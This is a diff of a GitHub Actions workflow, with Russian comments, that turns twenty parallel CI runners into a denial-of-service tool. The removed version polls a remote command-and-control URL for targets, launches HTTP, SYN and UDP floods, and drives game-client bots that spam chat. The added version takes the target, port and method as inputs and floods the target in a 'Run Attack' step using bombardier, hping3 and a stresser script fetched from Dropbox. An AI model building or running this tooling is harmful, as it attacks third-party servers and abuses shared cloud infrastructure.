@@ -1,102 +1,80 @@
-name: Ultimate Multi-Tool Executor
+name: Ultimate Multi-Tool (HTTP/TCP/UDP)
 
 on:
   workflow_dispatch:
+    inputs:
+      method:
+        description: 'Выберите метод'
+        required: true
+        default: 'http'
+        type: choice
+        options:
+          - http
+          - tcp
+          - udp
+          - udp-ddnet
+
+      target:
+        description: 'IP или URL (например: 1.1.1.1 или https://google.com)'
+        required: true
+
+      port:
+        description: 'Порт (для TCP/UDP)'
+        required: false
+        default: '80'
+
+      connections:
+        description: 'Количество соединений/потоков (для UDP)'
+        required: false
+        default: '500'
 
 jobs:
-  main:
+  str-test:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10,11,12,13,14,15,16,17,18,19,20]
+        runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Install All Tools
+      - name: Install Tools
         run: |
           sudo apt-get update
-          sudo apt-get install -y hping3 golang-go wget curl xvfb xdotool jq libsdl2-2.0-0 libcurl4 openbox
-          
-          wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
-          chmod +x bombardier && sudo mv bombardier /usr/local/bin/
-          
+          sudo apt-get install -y hping3 golang-go wget curl
+
+          # Скачиваем bombardier
+          wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
+          chmod +x bombardier-linux-amd64
+          sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
+
+      - name: Download Bombarida (UDP Stresser)
+        run: |
           wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
 
-          LINK=$(curl -s https://ddnet.org/downloads/ | grep -o 'href="[^"]*linux_x86_64\.tar\.xz"' | head -n 1 | cut -d'"' -f2)
-          curl -L -o ddnet.tar.xz "https://ddnet.org/downloads/$LINK"
-          tar -xf ddnet.tar.xz && mv DDNet-* ddnet_folder
-
-      - name: Control Loop
-        env:
-          CONTROL_URL: "https://me5years.alwaysdata.net/index.php?action=get"
+      - name: Run Attack
         run: |
-          export DISPLAY=:99
-          Xvfb :99 -screen 0 1024x768x24 +extension GLX +render -noreset & sleep 2
-          openbox &
-          export LIBGL_ALWAYS_SOFTWARE=1
-          
-          LAST_ID="0"
-          CURRENT_STRESS_PID=""
+          METHOD="${{ github.event.inputs.method }}"
+          TARGET="${{ github.event.inputs.target }}"
+          PORT="${{ github.event.inputs.port }}"
+          CONNS="${{ github.event.inputs.connections }}"
 
-          while true; do
-            RESPONSE=$(curl -s --max-time 2 "$CONTROL_URL")
-            ID=$(echo "$RESPONSE" | jq -r '.id // 0')
+          echo "Запуск $METHOD на $TARGET с машины №${{ matrix.runner }}"
 
-            if [[ "$ID" != "$LAST_ID" ]]; then
-              LAST_ID=$ID
-              ACTION=$(echo "$RESPONSE" | jq -r '.action')
-              TARGET=$(echo "$RESPONSE" | jq -r '.target')
-              PORT=$(echo "$RESPONSE" | jq -r '.port')
-              VAL=$(echo "$RESPONSE" | jq -r '.value')
+          if [ "$METHOD" == "http" ]; then
+            while true; do
+              bombardier -c 1000 -d 300s --http2 -l "$TARGET?cache=$RANDOM"
+            done
 
-              echo "Выполняю команду: $ACTION"
+          elif [ "$METHOD" == "tcp" ]; then
+            sudo hping3 --flood -S -p $PORT $TARGET
 
-              # Команды Стресса
-              if [[ "$ACTION" == stress_* ]]; then
-                kill $CURRENT_STRESS_PID 2>/dev/null || true
-                pkill -9 bombardier hping3 go || true
-                
-                if [ "$ACTION" == "stress_http" ]; then
-                  bombardier -c 500 -d 3600s --http2 -l "$TARGET?cache=$RANDOM" & CURRENT_STRESS_PID=$!
-                elif [ "$ACTION" == "stress_tcp" ]; then
-                  sudo hping3 --flood -S -p $PORT $TARGET & CURRENT_STRESS_PID=$!
-                elif [ "$ACTION" == "stress_udp" ]; then
-                  go run bombarida.go -mode client -addr "$TARGET:$PORT" -c 500 -d 3600s & CURRENT_STRESS_PID=$!
-                elif [ "$ACTION" == "stress_udp_ddnet" ]; then
-                  go run bombarida.go -mode client -addr "$TARGET:$PORT" -ddnet-info -open-loop -c 500 -d 3600s & CURRENT_STRESS_PID=$!
-                fi
-              
-              # Команды Ботов
-              elif [[ "$ACTION" == bot_* ]]; then
-                WIDS=$(xdotool search --class "DDNet" 2>/dev/null)
-                
-                if [ "$ACTION" == "bot_connect" ]; then
-                  # Если окна нет - запускаем
-                  if [ -z "$WIDS" ]; then
-                    cd ddnet_folder && ./DDNet >/dev/null 2>&1 & sleep 5 && cd ..
-                    WIDS=$(xdotool search --class "DDNet" 2>/dev/null)
-                  fi
-                  for WID in $WIDS; do
-                    xdotool windowactivate --sync $WID
-                    xdotool key F1; sleep 0.5; xdotool type "connect $TARGET"; xdotool key Return; xdotool key F1
-                  done
-                
-                elif [ "$ACTION" == "bot_chat" ]; then
-                  for WID in $WIDS; do
-                    xdotool windowactivate --sync $WID
-                    xdotool key t; sleep 0.3; xdotool type "$VAL"; xdotool key Return
-                  done
+          elif [ "$METHOD" == "udp" ]; then
+            echo "Запуск обычного UDP flood (bombarida)"
+            go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
+              -c $CONNS -n 0 -d 300s -r 0 -t 1s
 
-                elif [ "$ACTION" == "bot_disconnect" ]; then
-                  for WID in $WIDS; do
-                    xdotool windowactivate --sync $WID
-                    xdotool key F1; sleep 0.5; xdotool type "disconnect"; xdotool key Return; xdotool key F1
-                  done
-                fi
-
-              elif [ "$ACTION" == "stop" ]; then
-                pkill -9 bombardier hping3 go DDNet || true
-              fi
-            fi
-            sleep 2
-          done
+          elif [ "$METHOD" == "udp-ddnet" ]; then
+            echo "Запуск UDP DDNet mode (bombarida)"
+            go run bombarida.go -mode client -addr "${TARGET}:${PORT}" \
+              -ddnet-info -open-loop -c $CONNS -n 0 -d 300s -r 0 -t 1s
+          fi
